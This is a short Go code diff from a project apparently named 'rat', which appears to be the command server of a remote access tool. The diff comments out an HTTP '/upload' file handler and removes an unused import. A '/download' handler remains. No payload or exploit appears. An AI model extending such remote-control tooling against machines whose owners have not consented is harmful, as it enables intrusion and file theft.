@@ -5,7 +5,6 @@ import (
 	"net/http"
 	"rat/command/log"
 	"rat/shared"
-	"strconv"
 )
 
 func setup(w http.ResponseWriter, r *http.Request) {
@@ -44,7 +43,7 @@ func init() {
 		}
 	})
 
-	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
+	/* http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
 		setup(w, r)
 
 		dir := r.PostFormValue("directory")
@@ -65,7 +64,7 @@ func init() {
 		if err != nil {
 			log.Println("upload:", err.Error())
 		}
-	})
+	}) */
 	http.HandleFunc("/download", func(w http.ResponseWriter, r *http.Request) {
 		setup(w, r)
 		if file, ok := TempFiles[r.FormValue("key")]; ok {
